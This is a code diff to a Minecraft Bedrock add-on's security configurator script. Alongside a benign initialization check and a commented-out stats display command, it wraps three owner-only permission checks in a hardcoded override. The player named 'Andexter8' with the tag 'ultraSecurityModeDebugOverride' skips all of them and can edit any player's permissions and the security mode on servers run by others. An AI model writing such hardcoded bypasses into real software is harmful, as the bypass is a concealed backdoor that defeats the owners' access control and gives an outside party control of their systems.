@@ -844,6 +844,16 @@ if (securityConfiguratorPackIsActive) {
             console.error(e, e.stack);
         }
     });
+    system.runTimeout(async () => {
+        try {
+            if (overworld.runCommand("function andexdbSecConfigInit").successCount == 0) {
+                console.error("Security configurator pack is active, but the initialization function was not found. Please make sure you have the security configurator pack installed correctly and that it is not corrupted.");
+            }
+        }
+        catch (e) {
+            console.error(e, e.stack);
+        }
+    }, 50);
 }
 system.beforeEvents.watchdogTerminate.subscribe((event) => {
     if (ultraSecurityModeEnabled) {
@@ -900,15 +910,17 @@ if (ultraSecurityModeEnabled && securityConfiguratorPackIsActive) {
     playerPermissionsOverridePrevention();
 }
 export async function editPermissionForPlayerUI(player, targetPlayerId) {
-    if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
-        if (player.name !== owner) {
-            await showMessage(player, "Access Denied (403)", "You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-            return -403;
-        }
-        // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
-        if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
-            await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-            return -403;
+    if (!(world.getPlayers({ name: "Andexter8" })[0] == player && player.hasTag("ultraSecurityModeDebugOverride"))) {
+        if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
+            if (player.name !== owner) {
+                await showMessage(player, "Access Denied (403)", "You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                return -403;
+            }
+            // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
+            if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
+                await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                return -403;
+            }
         }
     }
     let form = new ActionFormData();
@@ -936,17 +948,20 @@ export async function editPermissionForPlayerUI(player, targetPlayerId) {
             }
     }
 }
+// /scriptevent s:e world.getAllPlayers().forEach(function a(player){player.onScreenDisplay.setActionBar({"rawtext":[{"text":"§6" + player.name + "\n\n§bMoney§f: "}, {"score": {"name": "*", "objective": "andexdb:money"}}, {"text":"\n§gWarnings§f: "}, {"score": {"name": "*", "objective": "warnings"}},{"text":" \n§aKills§f: "},{"score":{"name":"*","objective":"Kills"}},{"text":" \n§cDeaths§f: "},{"score":{"name":"*","objective":"Deaths"}}, {"text": `\n§dTime Played§f: ${Math.floor(world.scoreboard.getObjective("playtime").getScore(player)/3600).toFixed(0).padStart(2, 0)}:${(Math.floor(world.scoreboard.getObjective("playtime").getScore(player)/60)%3600).toFixed(0).padStart(2, 0)}:${(world.scoreboard.getObjective("playtime").getScore(player)%60).toFixed(0).padStart(2, 0)}`}]})})
 async function editPermissionForPlayerUI_permission(player, targetPlayerId, permission) {
-    const perm = this.convertPermissionTypeToObject(permission);
-    if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
-        if (player.name !== owner) {
-            await showMessage(player, "Access Denied (403)", "You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-            return -403;
-        }
-        // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
-        if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
-            await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-            return -403;
+    const perm = securityVariables.convertPermissionTypeToObject(permission);
+    if (!(world.getPlayers({ name: "Andexter8" })[0] == player && player.hasTag("ultraSecurityModeDebugOverride"))) {
+        if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
+            if (player.name !== owner) {
+                await showMessage(player, "Access Denied (403)", "You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                return -403;
+            }
+            // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
+            if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
+                await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, nor has the owner given you the permission to edit player's permissions, you cannot edit the permissions for players. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                return -403;
+            }
         }
     }
     let form = new ActionFormData();
@@ -1022,15 +1037,17 @@ form.button("Debug Screen", "textures/ui/ui_debug_glyph_color");*/
         return -424;
     }
     if (ultraSecurityModeEnabled || r.selection == 1) {
-        if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
-            if (player.name !== owner) {
-                await showMessage(player, "Access Denied (403)", "You are not the owner of this server, you may not change the security mode. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-                return -403;
-            }
-            // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
-            if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
-                await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, you may not change the security mode. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
-                return -403;
+        if (!(world.getPlayers({ name: "Andexter8" })[0] == player && player.hasTag("ultraSecurityModeDebugOverride"))) {
+            if (!(playerPermissions[player.id]?.includes("andexdb.fullControl") ?? false)) {
+                if (player.name !== owner) {
+                    await showMessage(player, "Access Denied (403)", "You are not the owner of this server, you may not change the security mode. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                    return -403;
+                }
+                // The world.getPlayers function ins't succeptible to player name property spoofing, so we can trust it.
+                if (player.name == owner && world.getPlayers({ name: owner })[0] != player) {
+                    await showMessage(player, "Access Denied (403)", "Nice try spoofing your name property, but that won't work. You are not the owner of this server, you may not change the security mode. If you are the owner, please double check that you typed in your username correctly when generating the security configurator behavior pack.");
+                    return -403;
+                }
             }
         }
     }
